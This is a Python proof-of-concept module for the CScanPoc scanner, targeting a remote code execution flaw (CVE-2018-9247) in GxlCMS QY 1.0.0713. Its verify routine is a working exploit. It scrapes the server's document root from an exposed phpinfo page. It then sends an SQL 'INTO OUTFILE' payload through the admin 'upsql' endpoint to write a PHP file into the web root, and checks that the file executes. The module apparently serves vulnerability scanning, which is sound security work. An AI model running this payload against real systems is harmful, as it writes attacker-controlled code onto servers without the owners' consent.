# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'GxlCMS_0003'  # 平台漏洞编号，留空
    name = 'GxlcmsQY任意PHP代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-04-04'  # 漏洞公布时间
    desc = '''
        Gxlcms是一套企业网站创建系统。
        Gxlcms QY 1.0.0713版本中的\Lib\Lib\Action\Admin\DataAction.class.php文件的‘upsql’函数存在安全漏洞。远程攻击者可借助‘sql’参数利用该漏洞执行任意SQL语句，然后执行任意的PHP代码。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-07656'  # 漏洞来源
    cnvd_id = 'CNVD-2018-07656'  # cnvd漏洞编号
    cve_id = 'CVE-2018-9247'  # cve编号
    product = 'GxlCMS'  # 漏洞应用名称
    product_version = '1.0.0713'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e7617f4-e2b6-4636-b93c-8e9150d0f308'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 获取网站绝对路径
            document_root = ''
            payload = '/gxlcms/index.php?s=Admin-Index-phpinfo'
            url = self.target + payload
            r = requests.get(url)
            p = re.compile(r'DOCUMENT_ROOT\'\]</td><td class=\"v\">(.+)</td>')
            if p.findall(r.text):
                document_root = p.findall(r.text)[0]
                self.output.info('获取到网站绝对路径{}'.format(document_root))

            # 上传文件
            payload = '/gxlcms/index.php?s=Admin-Data-upsql'
            url = self.target + payload
            data = "sql=select '<?php phpinfo();echo md5(c)?>' INTO OUTFILE '{}/gxlcms/cscan.php';&submit=%E6%8F%90+%E4%BA%A4&hash=ab2af3933aa472eba3a25e8d69852e55".format(document_root)
            requests.post(url, data=data)
            verify_url = self.target + '/gxlcms/cscan.php'
            r = requests.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
